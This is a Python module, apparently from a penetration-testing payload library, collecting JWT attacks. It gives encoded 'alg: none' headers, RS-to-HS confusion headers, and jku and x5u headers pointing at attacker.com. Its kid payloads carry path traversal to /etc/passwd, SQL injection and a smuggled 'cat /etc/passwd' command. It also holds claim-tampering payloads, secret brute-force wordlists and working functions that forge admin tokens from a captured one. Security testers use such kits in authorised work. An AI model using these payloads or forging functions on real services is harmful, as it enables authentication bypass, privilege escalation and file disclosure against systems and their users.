"""
JWT (JSON Web Token) Attack Payloads
Algorithm confusion, key confusion, and more
"""

import base64
import json
import hmac
import hashlib

JWT_ATTACKS = {
    "algorithm_confusion": {
        "none": [
            # Algorithm: none attack
            # Header: {"alg": "none", "typ": "JWT"}
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0",
            "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0",
            "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0",
            "eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0",
        ],
        "rs_to_hs": [
            # RS256 to HS256 confusion
            # Use public key as HMAC secret
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",
        ],
    },

    "weak_secrets": [
        # Common weak secrets to try
        "secret",
        "password",
        "123456",
        "jwt_secret",
        "supersecret",
        "changeme",
        "admin",
        "key",
        "private",
        "secret123",
        "jwt",
        "token",
        "auth",
        "your-256-bit-secret",
        "your-secret-key",
        "my-secret-key",
        "my_secret_key",
        "development",
        "production",
        "test",
        "debug",
        "",  # Empty secret
    ],

    "header_injection": {
        "jku": [
            # JKU (JSON Web Key Set URL) injection
            '{"alg": "RS256", "typ": "JWT", "jku": "http://attacker.com/jwks.json"}',
        ],
        "jwk": [
            # JWK (JSON Web Key) embedding
            '{"alg": "RS256", "typ": "JWT", "jwk": {"kty": "RSA", "n": "...", "e": "AQAB"}}',
        ],
        "kid": [
            # KID (Key ID) injection
            '{"alg": "HS256", "typ": "JWT", "kid": "/dev/null"}',
            '{"alg": "HS256", "typ": "JWT", "kid": "../../etc/passwd"}',
            '{"alg": "HS256", "typ": "JWT", "kid": "/proc/sys/kernel/randomize_va_space"}',
            '{"alg": "HS256", "typ": "JWT", "kid": "key1\' UNION SELECT \'secret\'--"}',
            '{"alg": "HS256", "typ": "JWT", "kid": "key1|cat /etc/passwd"}',
        ],
        "x5u": [
            # X5U (X.509 URL) injection
            '{"alg": "RS256", "typ": "JWT", "x5u": "http://attacker.com/cert.pem"}',
        ],
        "x5c": [
            # X5C (X.509 Certificate Chain) injection
            '{"alg": "RS256", "typ": "JWT", "x5c": ["MIIBkTCB+wIJAL..."]}',
        ],
    },

    "claim_manipulation": {
        "admin": [
            # Common admin escalation claims
            '{"admin": true}',
            '{"role": "admin"}',
            '{"roles": ["admin"]}',
            '{"is_admin": true}',
            '{"isAdmin": true}',
            '{"user_type": "admin"}',
            '{"type": "admin"}',
            '{"group": "administrators"}',
            '{"groups": ["administrators"]}',
            '{"privileges": ["admin"]}',
        ],
        "user_id": [
            # User ID manipulation
            '{"sub": "1"}',
            '{"sub": "0"}',
            '{"user_id": 1}',
            '{"userId": 1}',
            '{"uid": 1}',
            '{"id": 1}',
        ],
        "expiration": [
            # Expiration manipulation
            '{"exp": 9999999999}',
            '{"exp": 4102444800}',  # Year 2100
            '{"iat": 1, "exp": 9999999999}',
        ],
    },
}

# JWT tool functions
def create_none_token(payload: dict) -> str:
    """Create a JWT with algorithm: none"""
    header = {"alg": "none", "typ": "JWT"}
    header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
    payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
    return f"{header_b64}.{payload_b64}."


def create_hs256_token(payload: dict, secret: str) -> str:
    """Create a JWT with HS256"""
    header = {"alg": "HS256", "typ": "JWT"}
    header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
    payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
    message = f"{header_b64}.{payload_b64}"
    signature = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
    signature_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
    return f"{message}.{signature_b64}"


def decode_jwt_parts(token: str) -> dict:
    """Decode JWT without verification"""
    parts = token.split('.')
    if len(parts) != 3:
        return {}

    def decode_part(part):
        # Add padding if needed
        padding = 4 - len(part) % 4
        if padding != 4:
            part += '=' * padding
        try:
            return json.loads(base64.urlsafe_b64decode(part))
        except:
            return {}

    return {
        "header": decode_part(parts[0]),
        "payload": decode_part(parts[1]),
        "signature": parts[2]
    }


def forge_admin_token(original_token: str, secret: str = "") -> list:
    """Generate forged admin tokens from original"""
    decoded = decode_jwt_parts(original_token)
    if not decoded.get("payload"):
        return []

    payload = decoded["payload"]
    forged_tokens = []

    # Add admin claims
    admin_payloads = [
        {**payload, "admin": True},
        {**payload, "role": "admin"},
        {**payload, "is_admin": True},
        {**payload, "roles": ["admin"]},
        {**payload, "sub": "admin"},
        {**payload, "user_id": 1},
    ]

    # Generate tokens with algorithm none
    for p in admin_payloads:
        forged_tokens.append({
            "token": create_none_token(p),
            "method": "algorithm:none",
            "payload": p
        })

    # If secret provided, generate HS256 tokens
    if secret:
        for p in admin_payloads:
            forged_tokens.append({
                "token": create_hs256_token(p, secret),
                "method": f"HS256 with secret '{secret}'",
                "payload": p
            })

    return forged_tokens


# Wordlist for JWT secret bruteforce
JWT_SECRET_WORDLIST = [
    "secret", "password", "123456", "admin", "key", "jwt", "token",
    "jwt_secret", "jwt-secret", "jwtSecret", "JWT_SECRET",
    "secret_key", "secretkey", "SECRET_KEY", "SECRETKEY",
    "private", "privatekey", "private_key", "PRIVATE_KEY",
    "auth", "authentication", "AUTH_SECRET",
    "supersecret", "super_secret", "superSecret",
    "changeme", "change_me", "changeMe",
    "development", "dev", "production", "prod", "staging",
    "test", "testing", "debug",
    "your-256-bit-secret", "your-secret-key", "my-secret-key",
    "application-secret", "app-secret", "app_secret",
    "api-secret", "api_secret", "apiSecret",
    "hmac-secret", "hmac_secret", "hmacSecret",
    "signing-key", "signing_key", "signingKey",
    "encryption-key", "encryption_key", "encryptionKey",
    "qwerty", "qwerty123", "password123", "admin123",
    "letmein", "welcome", "monkey", "dragon",
    "master", "login", "abc123", "111111", "access",
    "",  # Empty string
    " ",  # Space
]
